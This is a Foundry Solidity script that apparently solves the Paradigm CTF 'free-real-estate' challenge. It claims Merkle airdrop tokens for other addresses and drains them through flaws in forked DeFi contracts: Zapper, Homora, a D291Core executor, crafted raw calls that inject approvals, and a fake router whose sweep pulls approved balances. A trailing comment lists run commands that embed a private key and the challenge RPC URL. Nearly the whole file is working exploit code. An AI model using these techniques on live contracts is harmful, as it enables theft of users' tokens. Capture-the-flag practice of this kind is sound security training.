// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "forge-std/StdJson.sol";

import "../src/Challenge.sol";
import "../src/InuToken.sol";

import "merkle-distributor/MerkleDistributor.sol";


    struct Summary {
        uint256 fileCount;
    }

    struct Proofs {
        address target;
        uint256 index;
        uint256 amount;
        bytes32[] proofs;
    }

interface UniSwapAddLiquityV4_General {
    function LetsInvest(
        address _TokenContractAddress,
        address _towhomtoissue,
        uint[] memory distribution,
        uint _minimumReturn
    ) external payable returns (uint256);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}
interface IUniV1Factory {
    function createExchange(address token) external returns (address);
    function getExchange(
        address token
    ) external view returns (address exchange);
}
interface IUniV1Pair {
    function removeLiquidity(uint256 amount, uint256 min_eth, uint256 min_tokens, uint256 deadline) external returns (uint256, uint256);
    function addLiquidity(uint256 min_liquidity, uint256 max_tokens, uint256 deadline) external payable returns (uint256);
    function approve(address target, uint256 amount) external;
}
interface D291Core {
    function executeActions(
        Action[] calldata actions,
        AbsoluteTokenAmount[] calldata requiredOutputs,
        address payable account
    ) external returns (AbsoluteTokenAmount[] memory);
    struct AbsoluteTokenAmount {
        address token;
        uint256 amount;
    }
    struct Action {
        bytes32 protocolAdapterName;
        ActionType actionType;
        TokenAmount[] tokenAmounts;
        bytes data;
    }
    struct TokenAmount {
        address token;
        uint256 amount;
        AmountType amountType;
    }
    enum ActionType { None, Deposit, Withdraw }
    enum AmountType { None, Relative, Absolute }
}

interface Zapper {
    function ZapBridge(
        address _toWhomToIssue,
        address _FromTokenContractAddress,
        address _ToTokenContractAddress,
        uint256 _IncomingLP
    ) external returns (bool);
}



interface IStep2Target {
    function swap(
        address fromToken,
        address toToken,
        uint256 amount,
        uint256 minReturn,
        uint256[] memory distribution, // [Uniswap, Kyber, Bancor, Oasis]
        uint256 flags // 16 - Compound, 32 - Fulcrum, 64 - Chai, 128 - Aave, 256 - SmartToken, 1024 - bDAI
    ) external payable;

    function _swapOnBancorSafe(
        IERC20 fromToken,
        IERC20 toToken,
        uint256 amount
    ) external returns(uint256);
}
interface IStep3Target {
    function LetsInvest(address _TokenContractAddress, address _towhomtoissue) external payable returns (uint256);
}

interface HomoraStruct {
    struct Amounts {
        uint amtAUser;
        uint amtBUser;
        uint amtLPUser;
        uint amtABorrow;
        uint amtBBorrow;
        uint amtLPBorrow;
        uint amtAMin;
        uint amtBMin;
    }

    struct RepayAmounts {
        uint amtLPTake;
        uint amtLPWithdraw;
        uint amtARepay;
        uint amtBRepay;
        uint amtLPRepay;
        uint amtAMin;
        uint amtBMin;
    }
}

interface Homora is HomoraStruct {
    function execute(
        uint positionId,
        address spell,
        bytes memory data
    ) external payable returns (uint256);

    function addLiquidityWERC20(
        address tokenA,
        address tokenB,
        Amounts calldata amt
    ) external payable;

    function removeLiquidityWERC20(
        address tokenA,
        address tokenB,
        RepayAmounts calldata amt
    ) external;
}

interface WETH is IERC20 {
    function deposit() external payable;
}

interface Uniswap {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

}

contract Fake {
    address fakeErc;
    constructor(address _fakeErc) {
        fakeErc = _fakeErc;
    }
    function factory() public view returns (address) {
        return address(this);
    }
    function WETH() public view returns (address) {
        return address(this);
    }
    function balanceOf(address) public view returns (uint) {
        return 0;
    }
    function approve(address, uint) public returns (bool) {
        return true;
    }
    function getPair(address, address) public view returns (address) {
        return address(fakeErc);
    }
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity) {

    }
    function lockLPToken (address _lpToken, uint256 _amount, uint256 _unlock_date, address payable _referral) external payable {

    }
    function sweep(address from, address to) public {
        uint256 amount = ERC20(fakeErc).balanceOf(address(from));
        ERC20(fakeErc).transferFrom(from, to, amount);
    }
}

contract POCLoader {
    Challenge public challenge;
    MerkleDistributor public merkleDistributor;
    InuToken public inuToken;

    function setEnv(address chal_, address md_, address inu_) public {
        challenge = Challenge(chal_);
        merkleDistributor = MerkleDistributor(md_);
        inuToken = InuToken(inu_);
    }
    receive() external payable {}

    function Result() public {
        console.log("my inu balance : %d", inuToken.balanceOf(address(this)));
    }

    function finalResult(address target) public {
        inuToken.transfer(address(target), inuToken.balanceOf(address(this))); // 나중에는 chal로 바꿔야됨.
        console.log("finalResult : target inu balance : %d", inuToken.balanceOf(address(target)));
    }
    function step1(address target, uint256 index, uint256 amount, bytes32[] calldata proofs) public {
        merkleDistributor.claim(index, target, amount, proofs);

        bytes memory calldat = abi.encode(address(this), amount);
        bytes4 selector = bytes4(keccak256(bytes("approve(address,uint256)")));
        bytes memory data = abi.encodePacked(uint16(0x03d7), selector, calldat, address(inuToken));
        assembly {
            pop(call(gas(), target, 0, add(data, 32), mload(data), 0x0, 0x0))
        }

        inuToken.transferFrom(target, address(this), amount);
        console.log("step1 completed. inu balance : %d", inuToken.balanceOf(address(this)));
    }

    function step2(address target, uint256 index, uint256 amount, bytes32[] calldata proofs) public {
        //address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        merkleDistributor.claim(index, target, amount, proofs);
        uint256[] memory distribution = new uint256[](1);
        distribution[0] = 1;
        try IStep2Target(target).swap(address(inuToken), address(inuToken), 0, 0, distribution, 0) {

        } catch (bytes memory _errorCode) {
            console.log("Error....");
        }
    }
    function step3(address target, uint256 index, uint256 amount, bytes32[] calldata proofs) public {
        merkleDistributor.claim(index, target, amount, proofs);

        IUniV1Factory fac = IUniV1Factory(0xc0a47dFe034B400B47bDaD5FecDa2621de6c4d95);
        IUniV1Pair pair = IUniV1Pair(fac.getExchange(address(inuToken)));
        if(address(pair)==address(0)) {
            pair = IUniV1Pair(fac.createExchange(address(inuToken)));
            console.log("pair : %s", address(pair));
        }

        //IUniV1Pair pair = IUniV1Pair(fac.createExchange(address(inuToken)));

        inuToken.approve(address(pair), type(uint256).max);
        pair.addLiquidity{value:1000000000}(0, 1000000000*10000, type(uint256).max);
        IStep3Target(target).LetsInvest{value:10000}(address(inuToken), address(this));
        pair.removeLiquidity(IERC20(address(pair)).balanceOf(address(this)), 1, 1, type(uint256).max);
    }

    function step6(address target, uint256 index, uint256 amount, bytes32[] calldata proofs) public {
        merkleDistributor.claim(index, target, amount, proofs);
        console.log("this is step6!!!");
        IUniV1Factory fac = IUniV1Factory(
            0xc0a47dFe034B400B47bDaD5FecDa2621de6c4d95
        );


        IUniV1Pair pair = IUniV1Pair(fac.getExchange(address(inuToken)));
        if(address(pair)==address(0)) {
            pair = IUniV1Pair(fac.createExchange(address(inuToken)));
            console.log("pair : %s", address(pair));
        }

        inuToken.approve(address(pair), 1e18);
        pair.addLiquidity{value: 1000000000}(
            0,
            1000000000 * 10000,
            type(uint256).max
        );

        uint256[] memory temp = new uint256[](9);
        temp[0] = 1;
        UniSwapAddLiquityV4_General(target).LetsInvest{value: 1000000000}(
            address(inuToken),
            address(this),
            temp,
            0
        );
        pair.removeLiquidity(
            IERC20(address(pair)).balanceOf(address(this)),
            1,
            1,
            type(uint256).max
        );
        console.log("step6 inu token balance : %d", inuToken.balanceOf(address(this)));
    }

    function step4(address target, uint256 index, uint256 amount, bytes32[] calldata proofs) public {
        merkleDistributor.claim(index, target, amount, proofs);
        D291Core.Action[] memory lmao = new D291Core.Action[](0);
        D291Core.AbsoluteTokenAmount[] memory tk = new D291Core.AbsoluteTokenAmount[](1);
        tk[0] = D291Core.AbsoluteTokenAmount({token: address(inuToken), amount: 575873999999999986892800});
        D291Core(target).executeActions(lmao, tk, payable(address(this)));
    }

    function step7(address target, uint256 index, uint256 amount, bytes32[] calldata proofs) public {
        merkleDistributor.claim(index, target, amount, proofs);
        Fake fake = new Fake(address(inuToken));
        Fake fake2 = new Fake(address(inuToken));
        inuToken.approve(target, 1000000000000 ether);

        address varg0;
        uint256 varg1;
        address varg2;
        uint256 varg3;
        uint256 varg4;
        address varg5;

        varg0 = address(inuToken);
        varg5 = address(fake);
        varg2 = address(fake2);

        address(target).call(abi.encodeWithSelector(0x3b822516, varg0, varg1, varg2, varg3, varg4, varg5));

        address fund = address(this);
        fake2.sweep(target, fund);
    }

    function step8(address target, uint256 index, uint256 amount, bytes32[] calldata proofs) public {
        merkleDistributor.claim(index, target, amount, proofs);
        InuToken anotherInu = new InuToken();
        IUniV1Factory fac = IUniV1Factory(0xc0a47dFe034B400B47bDaD5FecDa2621de6c4d95);
        IUniV1Pair anotherPair = IUniV1Pair(fac.getExchange(address(anotherInu)));
        if(address(anotherPair)==address(0))
        {
            anotherPair = IUniV1Pair(fac.createExchange(address(anotherInu)));
        }
        IUniV1Pair regPair = IUniV1Pair(fac.getExchange(address(inuToken)));
        if(address(regPair)==address(0)){
            regPair = IUniV1Pair(fac.createExchange(address(inuToken)));
        }

        anotherInu.approve(address(anotherPair), type(uint256).max);
        inuToken.approve(address(regPair), type(uint256).max);

        anotherPair.addLiquidity{value:1000000000}(0, 1000000000*10000, type(uint256).max);
        regPair.addLiquidity{value:1000000000}(0, 1000000000*10000, type(uint256).max);

        anotherPair.approve(target, type(uint256).max);
        regPair.approve(target, type(uint256).max);
        anotherInu.approve(target, type(uint256).max);
        inuToken.approve(target, type(uint256).max);

        Zapper(target).ZapBridge(address(this), address(anotherInu), address(inuToken), 1e6);
    }

    function execute(address target, uint256 index, uint256 amount, bytes32[] calldata proofs, string calldata step) public {
        console.log("step : %s", step);
        if(keccak256(abi.encodePacked((step)))==keccak256(abi.encodePacked(("step1")))){
            console.log("bungi step1");
            step1(target, index, amount, proofs);
        }
        else if(keccak256(abi.encodePacked((step)))==keccak256(abi.encodePacked(("step2")))){
            console.log("bungi step2");
            step2(target, index, amount, proofs);
        }
        else if(keccak256(abi.encodePacked((step)))==keccak256(abi.encodePacked(("step3")))){
            console.log("bungi step3");
            step3(target, index, amount, proofs);
        }
        else if(keccak256(abi.encodePacked((step)))==keccak256(abi.encodePacked(("step4")))){
            console.log("bungi step4");
            step4(target, index, amount, proofs);
        }
        else if(keccak256(abi.encodePacked((step)))==keccak256(abi.encodePacked(("step6")))){
            console.log("bungi step6");
            step6(target, index, amount, proofs);
        }
        else if(keccak256(abi.encodePacked((step)))==keccak256(abi.encodePacked(("step7"))))
        {
            step7(target, index, amount, proofs);
        }
        else if(keccak256(abi.encodePacked((step)))==keccak256(abi.encodePacked(("step8"))))
        {
            step8(target, index, amount, proofs);
        }
        else {
            console.log("bungi siibal");
        }
    }
}

contract Deploy is Script {
    bool debug = false;
    function setUp() public {}
    function run() public {
        uint256 mykey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(mykey);

        // Real Env
        if(!debug) {
            Challenge chal = Challenge(address(0xf405Fb750AB33FF2a8ee3Fc93d16265525A53e78));
            IMerkleDistributor distributor = chal.MERKLE_DISTRIBUTOR();
            InuToken inu = InuToken(address(distributor.token()));
            POCLoader loader = new POCLoader();

            payable(address(loader)).transfer(100 ether);
            loader.setEnv(address(chal), address(distributor), address(inu));

            console.log("loader : %s", address(loader));
        }
        else {
            InuToken inu = new InuToken();
            bytes32 merkleRoot = 0x43c82b918f439b8608d0624cc9a557518faecb07d399460a737c4f9b62b32591;
            MerkleDistributor distributor = new MerkleDistributor(address(inu), merkleRoot);
            inu.transfer(address(distributor), 0xb16c7747f6a745eab00000);
            Challenge chal = new Challenge(distributor);
            POCLoader loader = new POCLoader();

            payable(address(loader)).transfer(100 ether);
            loader.setEnv(address(chal), address(distributor), address(inu));
            console.log("loader : %s", address(loader));
        }

        vm.stopBroadcast();
    }
}

contract EndContract is Script {
    function setUp() public {

    }

    function run() public {
        uint256 mykey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(mykey);
        IERC20(0xF442DDeD2Cf59f6396E4CBD88302A4768aAda2B2).transfer(0x01687727F0DacFC8B439fADb1d6b557378A00129, IERC20(0xF442DDeD2Cf59f6396E4CBD88302A4768aAda2B2).balanceOf(vm.addr(mykey)));
        vm.stopBroadcast();
    }
}

contract Solve is Script {
    function setUp() public {
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len;
        while (_i != 0) {
            k = k-1;
            uint8 temp = (48 + uint8(_i - _i / 10 * 10));
            bytes1 b1 = bytes1(temp);
            bstr[k] = b1;
            _i /= 10;
        }
        return string(bstr);
    }

    function step5(POCLoader loader, address target, uint256 index, uint256 amount, bytes32[] memory proofs) public {
        Uniswap factory = Uniswap(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
        Uniswap router = Uniswap(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        WETH weth = WETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        Homora bank = Homora(0x5f5Cd91070960D13ee549C9CC47e7a4Cd00457bb);

        MerkleDistributor merkleDistributor = loader.merkleDistributor();
        IERC20 inuToken = IERC20(loader.inuToken());
        merkleDistributor.claim(index, target, amount, proofs);
        ERC20 pair = ERC20(factory.createPair(address(inuToken), address(weth)));
        weth.deposit{value: 2 ether}();
        inuToken.approve(address(router), type(uint256).max);
        weth.approve(address(router), type(uint256).max);
        router.addLiquidity(address(inuToken), address(weth), 1e18, 1e18, 1, 1, vm.addr(vm.envUint("PRIVATE_KEY")), type(uint256).max);
        inuToken.approve(address(bank), type(uint256).max);
        weth.approve(address(bank), type(uint256).max);

        pair.transfer(target, pair.balanceOf(vm.addr(vm.envUint("PRIVATE_KEY"))) / 10);

        bytes memory cd2 = abi.encodeWithSelector(Homora.removeLiquidityWERC20.selector, address(inuToken), address(weth), HomoraStruct.RepayAmounts({amtLPTake: 0, amtLPWithdraw: 0, amtARepay: 0, amtBRepay: 0, amtLPRepay: 0, amtAMin: 0, amtBMin: 0}));

        uint256 uid = bank.execute(0, target, cd2);

        pair.approve(address(router), type(uint256).max);
        router.removeLiquidity(address(inuToken), address(weth), pair.balanceOf(vm.addr(vm.envUint("PRIVATE_KEY"))), 0, 0, address(this), type(uint256).max);
    }

    function run() public {
        uint256 mykey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(mykey);
        string memory step = vm.envString("STEP");

        POCLoader loader = POCLoader(payable(address(0x5878A93912130bB8318C4119aaB8eC754EA83C74)));
        string[] memory paths = new string[](1);
        paths[0] = string(abi.encodePacked("process_data/", step, "/"));

        bool first_flag = false;
        for(uint pathIndex=0;pathIndex<paths.length;pathIndex++){
            string memory summary_path = string(abi.encodePacked(paths[pathIndex], "summary.json"));
            string memory file_txt = vm.readFile(summary_path);
            bytes memory summaryJson = vm.parseJson(file_txt);

            Summary memory summary = abi.decode(summaryJson, (Summary));
            console.log("summary txt : %s, fileCount : %d", file_txt, summary.fileCount);
            string memory tmpStep = string(abi.encodePacked(step));
            for(uint256 fileIndex=0;fileIndex<summary.fileCount;fileIndex++){
                string memory proofs_path = string(abi.encodePacked(paths[pathIndex], uint2str(fileIndex), ".json"));
                string memory proofs_txt = vm.readFile(proofs_path);
                bytes memory proofsJson = vm.parseJson(proofs_txt);
                Proofs memory proofs = abi.decode(proofsJson, (Proofs));
                console.log("proofs_path : %s, target : %s", proofs_path, proofs.target);
                console.log("index : %d, amount : %d", proofs.index, proofs.amount);

                console.log("tmpStep : %s", tmpStep);
                if(keccak256(abi.encodePacked((tmpStep)))==keccak256(abi.encodePacked(("step5")))){
                    if(first_flag == false) {
                        loader.finalResult(vm.addr(vm.envUint("PRIVATE_KEY")));
                        first_flag = true;
                    }
                    step5(loader, proofs.target, proofs.index, proofs.amount, proofs.proofs);
                }
                else {
                    console.log("let'sgo");
                    loader.execute(proofs.target, proofs.index, proofs.amount, proofs.proofs, tmpStep);
                }
            }
        }

        loader.Result();
        console.log("end...");
        console.log("user inu balance : %d", IERC20(loader.inuToken()).balanceOf(vm.addr(mykey)));
        vm.stopBroadcast();
    }
}

contract SecondSolve is Script {
    Challenge public challenge;
    MerkleDistributor public merkleDistributor;
    InuToken public inuToken;
    function setUp() public {}
    function run() public {
        uint256 mykey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(mykey);

        challenge = Challenge(0xf405Fb750AB33FF2a8ee3Fc93d16265525A53e78);
        merkleDistributor = MerkleDistributor(0xf5212b216dF9738D5B7b1E5bCeD0f64d8E12Dd0B);
        inuToken = InuToken(0x72F56637a23BCB9e58D65439b91Df22F82a8ec05);

        address target = address(0xb1ec61949e5db1d681316c0e2f9132afb62fc32f);
        uint256 index = 96509;
        uint256 amount = 0x27c2d0b49d187c000000;
        bytes32[] memory proofs = new bytes32[](18);
        proofs[0] = 0x221e241614d998da4b7b2f8ffef5b1a3d6500d20163b87ad2b4e8f097bdb1d16;
        proofs[1] = 0x9f987f4ce7e6def9e6e15819306a1c8cf357622958bc1a842ea3deb478f06989;
        proofs[2] = 0x2c2036efd71fdde401ba7ac4f7ce8e1a326eb7f16c122465c98054e5ab63e163;
        proofs[3] = 0x57276a8a2109c9fa945105843f1da5da409100ef9003765f2a4a6f89726bb049;
        proofs[4] = 0xc5852c7d46478ac2b692ca1184e728fbf751f6b78b37e1290164b616f9b5b283;
        proofs[5] = 0xefca4735c415bf0ed66c827cdb21d72e5f480f44a815294e393b9401231a552d;
        proofs[6] = 0x66072119ebfdd84af53cf05675b2f53277402283961189cbf06a6645befa5ebb;
        proofs[7] = 0x27d4d981d7c01e18bc50a43fb57fbcbdea69a1ecb8e88b204e92584c0d733764;
        proofs[8] = 0xd95a2e42b230e615ed639d355af6af8dfdb0825e537e591026f84d1c347ec8ca;
        proofs[9] = 0x058e7f28ad45b8336ee08aafa0497e68731c6ec8400100f5b3dce07dd80bdf92;
        proofs[10] = 0xc7991bf8d66c8f2d82f2040ba77244784c17e1754482ac1329ee7a32f8dcf15a;
        proofs[11] = 0x1ba4faa9d7424b6f7d1d28e6304891ac5335a9f708e9fd92d09c8097555f49fa;
        proofs[12] = 0xda1a4d06e8ae29bf4105dae5b6518bf7587a89c619a4068c127b7426003a27b1;
        proofs[13] = 0x970da01df3f632958b65cb8ad2c385de6ec9e8910139f50df8354506e76b9f0a;
        proofs[14] = 0x03f19d69300362e279fc5ccf5df8834fbbefb017c77f87784678057f5c766e0a;
        proofs[15] = 0xc8db5593a5709dfaafbfd4a9af25b1abb7b488e0be6b16952595360f36d364e0;
        proofs[16] = 0x05d87b90d16d65eca608285be05f09d6be06ed26e996e2b0f51b3aa33aaa78eb;
        proofs[17] = 0xc61672b51620329157c09e93120384c7e539511991bb6ef9fc37f570f220f2f9;
        merkleDistributor.claim(index, target, amount, proofs);

        vm.stopBroadcast();
    }
}

/*

PRIVATE_KEY=0xcd9c8d46b37d55f1e4c7748edc9c9ea4f9e37bcc6a1b8fa030d96d1411fa72c7 forge script script/Debug.s.sol:Deploy -vvvv --rpc-url http://free-real-estate.challenges.paradigm.xyz:8545/c48b8a08-eba3-4ac3-afe5-40f100377a89/main --broadcast
PRIVATE_KEY=0xcd9c8d46b37d55f1e4c7748edc9c9ea4f9e37bcc6a1b8fa030d96d1411fa72c7 STEP=step1 forge script script/Debug.s.sol:Solve -vvvv --rpc-url http://free-real-estate.challenges.paradigm.xyz:8545/c48b8a08-eba3-4ac3-afe5-40f100377a89/main --broadcast
PRIVATE_KEY=0xcd9c8d46b37d55f1e4c7748edc9c9ea4f9e37bcc6a1b8fa030d96d1411fa72c7 STEP=step2 forge script script/Debug.s.sol:Solve -vvvv --rpc-url http://free-real-estate.challenges.paradigm.xyz:8545/c48b8a08-eba3-4ac3-afe5-40f100377a89/main --broadcast
PRIVATE_KEY=0xcd9c8d46b37d55f1e4c7748edc9c9ea4f9e37bcc6a1b8fa030d96d1411fa72c7 STEP=step3 forge script script/Debug.s.sol:Solve -vvvv --rpc-url http://free-real-estate.challenges.paradigm.xyz:8545/c48b8a08-eba3-4ac3-afe5-40f100377a89/main --broadcast
PRIVATE_KEY=0xcd9c8d46b37d55f1e4c7748edc9c9ea4f9e37bcc6a1b8fa030d96d1411fa72c7 STEP=step4 forge script script/Debug.s.sol:Solve -vvvv --rpc-url http://free-real-estate.challenges.paradigm.xyz:8545/c48b8a08-eba3-4ac3-afe5-40f100377a89/main --broadcast
PRIVATE_KEY=0xcd9c8d46b37d55f1e4c7748edc9c9ea4f9e37bcc6a1b8fa030d96d1411fa72c7 STEP=step6 forge script script/Debug.s.sol:Solve -vvvv --rpc-url http://free-real-estate.challenges.paradigm.xyz:8545/c48b8a08-eba3-4ac3-afe5-40f100377a89/main --broadcast
PRIVATE_KEY=0xcd9c8d46b37d55f1e4c7748edc9c9ea4f9e37bcc6a1b8fa030d96d1411fa72c7 STEP=step7 forge script script/Debug.s.sol:Solve -vvvv --rpc-url http://free-real-estate.challenges.paradigm.xyz:8545/c48b8a08-eba3-4ac3-afe5-40f100377a89/main --broadcast
PRIVATE_KEY=0xcd9c8d46b37d55f1e4c7748edc9c9ea4f9e37bcc6a1b8fa030d96d1411fa72c7 STEP=step8 forge script script/Debug.s.sol:Solve -vvvv --rpc-url http://free-real-estate.challenges.paradigm.xyz:8545/c48b8a08-eba3-4ac3-afe5-40f100377a89/main --broadcast
PRIVATE_KEY=0xcd9c8d46b37d55f1e4c7748edc9c9ea4f9e37bcc6a1b8fa030d96d1411fa72c7 STEP=step5 forge script script/Debug.s.sol:Solve -vvvv --rpc-url http://free-real-estate.challenges.paradigm.xyz:8545/c48b8a08-eba3-4ac3-afe5-40f100377a89/main --broadcast

PRIVATE_KEY=0xcd9c8d46b37d55f1e4c7748edc9c9ea4f9e37bcc6a1b8fa030d96d1411fa72c7 forge script script/Debug.s.sol:EndContract -vvvv --rpc-url http://free-real-estate.challenges.paradigm.xyz:8545/c48b8a08-eba3-4ac3-afe5-40f100377a89/main --broadcast
*/